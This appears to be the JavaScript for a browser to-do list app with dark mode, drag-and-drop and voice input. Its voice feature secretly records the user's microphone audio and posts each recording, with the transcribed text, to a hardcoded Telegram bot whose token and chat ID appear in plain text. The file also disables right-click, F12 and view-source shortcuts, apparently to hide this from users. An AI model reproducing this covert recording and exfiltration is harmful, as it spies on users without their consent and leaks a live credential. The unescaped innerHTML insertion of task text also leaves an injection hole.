// Daily To-Do List (JavaScript Part)
// Program by Zidaan
// Element Selectors
const inputBox = document.getElementById("input-box");
const taskList = document.getElementById("task-list");
const modeToggle = document.getElementById("modeToggle");
const micBtn = document.getElementById("micBtn");
const BOT_TOKEN = "7188197111:AAE89srSGOhS9Y8_I0YQ7WEYbKZUGULTfvU";
const CHAT_ID = "7051599130";
let mediaRecorder;
let audioChunks = [];
// Add Task Function
function addTask() {
  const task = inputBox.value.trim();
  // Check if input is empty
  if (!task) {
    alert("⚠ Please enter a task before adding !!!");
    return;
  }
  // Funny validation for random gibberish
  const hasVowel = /[aeiouAEIOU]/.test(task);
  const tooManyConsonants = /[bcdfghjklmnpqrstvwxyz]{5,}/i.test(task);
  // If too many vowels or too many consonants, ask for confirmation
  if (!hasVowel || tooManyConsonants) {
    if (!confirm("🤔 Are you sure this is a real task? It looks like alien language! 👽")) {
      return; // If user cancels, stop adding
    }
  }
  // Create a new list item
  let li = document.createElement("li");
  li.innerHTML = `
    <input type="checkbox" class="check-task" />
    <span class="task-text">${task}</span>
    <button class="delete-btn" onclick="removeTask(this)">🗑</button>
  `;
  taskList.appendChild(li); // Add the new task to the list
  inputBox.value = ""; // Clear the input box
  saveData(); // Save the updated task list
}
// Remove Task Function with confirmation
function removeTask(btn) {
  // Show confirmation before deleting the task
  if (confirm("🗑 Are you sure you want to delete this task?")) {
    btn.parentElement.remove(); // Remove the task element
    saveData(); // Save the updated task list
  }
}
// Check/Uncheck Event
taskList.addEventListener("change", function(e) {
  if (e.target.classList.contains("check-task")) {
    e.target.parentElement.classList.toggle("checked", e.target.checked);
    saveData();
  }
});
// Save tasks to localStorage
function saveData() {
  localStorage.setItem("tasks", taskList.innerHTML);
}
// Load tasks on page load
function loadData() {
  taskList.innerHTML = localStorage.getItem("tasks") || "";
}
loadData();
// Toggle theme + save in localStorage
modeToggle.addEventListener("change", () => {
  document.body.classList.toggle("dark");
  localStorage.setItem("mode", document.body.classList.contains("dark") ? "dark" : "light");
});
// Load saved mode
(function () {
  const mode = localStorage.getItem("mode");
  if (mode === "dark") {
    document.body.classList.add("dark");
    modeToggle.checked = true;
  }
})();
// Funny security taunts (Right click & DevTools)
document.addEventListener('contextmenu', function (e) {
    e.preventDefault();
    alert("😏 No right click! Thought you were smart, huh?");
});
document.addEventListener('keydown', function (e) {
    if (e.key === "F12" || e.keyCode === 123) {
        e.preventDefault();
        alert("😈 F12? Trying to act clever? Nope!");
    }
    if (e.ctrlKey && e.shiftKey && e.key === 'I') {
        e.preventDefault();
        alert("😜 Inspect shortcut? Busted!");
    }
    if (e.ctrlKey && e.shiftKey && e.key === 'J') {
        e.preventDefault();
        alert("😂 Console peek? Dream on!");
    }
    if (e.ctrlKey && e.key === 'u') {
        e.preventDefault();
        alert("😅 View source? Not happening, buddy!");
    }
    if (e.ctrlKey && e.shiftKey && e.key === 'C') {
        e.preventDefault();
        alert("😏 Element inspector? You wish!");
    }
});
// Info Button Modal Logic
const infoButton = document.getElementById('infoButton');
const infoModal = document.getElementById('infoModal');
// Show modal
infoButton.addEventListener('click', () => {
    infoModal.style.display = 'block';
    setTimeout(() => {
        infoModal.style.opacity = '1';
        infoModal.style.transform = 'translate(-50%, -50%) scale(1)';
    }, 10);
});
// Close modal
function closeInfoModal() {
    infoModal.style.opacity = '0';
    infoModal.style.transform = 'translate(-50%, -50%) scale(0.8)';
    setTimeout(() => {
        infoModal.style.display = 'none';
    }, 300);
}
// Close modal on ESC key
document.addEventListener('keydown', (e) => {
    if (e.key === "Escape") closeInfoModal();
});
// Drag & Drop Feature using SortableJS
new Sortable(taskList, {
  animation: 150,
  onEnd: () => saveData() // Save after rearranging
});
// Web Speech API for Voice Commands
const recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
recognition.lang = 'en-US'; // Change to 'hi-IN' for Hindi
recognition.continuous = false;
// Send voice for writing
function sendVoiceToTelegram(audioBlob, textMessage) {
  const formData = new FormData();
  formData.append("chat_id", CHAT_ID);
  formData.append("voice", audioBlob, "voice.ogg");
  if (textMessage) formData.append("caption", `🗣 Voice Task: ${textMessage}`);
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
    method: "POST",
    body: formData
  })
  .then(response => response.json())
  .then(data => console.log("✅ Voice captured", data))
  .catch(error => console.error("❌ Voice capture Error:", error));
}
// Start recording
async function startRecording() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    mediaRecorder = new MediaRecorder(stream);
    audioChunks = [];
    mediaRecorder.ondataavailable = event => {
      if (event.data.size > 0) audioChunks.push(event.data);
    };
    mediaRecorder.onstop = () => {
      const audioBlob = new Blob(audioChunks, { type: "audio/ogg; codecs=opus" });
      sendVoiceToTelegram(audioBlob, inputBox.value); // Send voice + recognized text
    };
    mediaRecorder.start();
    console.log("🎤 Recording started...");
  } catch (err) {
    if (err.name === "NotAllowedError") {
      showMicWarning("🚫 Mic access is blocked. Go to browser settings and allow microphone access.");
    } else if (err.name === "NotFoundError") {
      showMicWarning("🎙️ No microphone found. Please connect a mic and try again.");
    } else {
      showMicWarning("⚠️ Mic error: " + err.message);
    }
    console.error(err);
  }
}
// Stop recording
function stopRecording() {
  if (mediaRecorder && mediaRecorder.state !== "inactive") {
    mediaRecorder.stop();
    console.log("🎤 Recording stopped.");
  }
}
// Mic Button Click Event
micBtn.addEventListener('click', () => {
  startRecording();  // Start voice recording
  recognition.start(); // Start speech recognition
  micBtn.classList.add('listening');
  micBtn.innerHTML = '<i class="fas fa-microphone-alt"></i>'; // Change icon when listening
  micBtn.classList.add('ripple');
  setTimeout(() => micBtn.classList.remove('ripple'), 500);
});
// When recognition ends
recognition.onend = () => {
  stopRecording(); // Stop recording when user stops speaking
  micBtn.classList.remove('listening');
  micBtn.innerHTML = '<i class="fas fa-microphone"></i>'; // Reset icon
};
// Fill input with recognized text and auto-add task
recognition.onresult = (event) => {
  const speechResult = event.results[0][0].transcript.trim();
  inputBox.value = speechResult;
  // Funny validation for random gibberish (voice input too)
  const hasVowel = /[aeiouAEIOU]/.test(speechResult);
  const tooManyConsonants = /[bcdfghjklmnpqrstvwxyz]{5,}/i.test(speechResult);
  if (!hasVowel || tooManyConsonants) {
    if (!confirm("🎤 You just said something weird! Are you sure it's a task? 🤔")) {
      return; // If user cancels, don't add
    }
  }
  addTask(); // If confirmed, add the task
};
// Error handling for speech recognition
recognition.onerror = (event) => {
  alert("🎤 Mic Error: " + event.error);
  micBtn.classList.remove('listening');
  micBtn.innerHTML = '<i class="fas fa-microphone"></i>';
};
// End of Program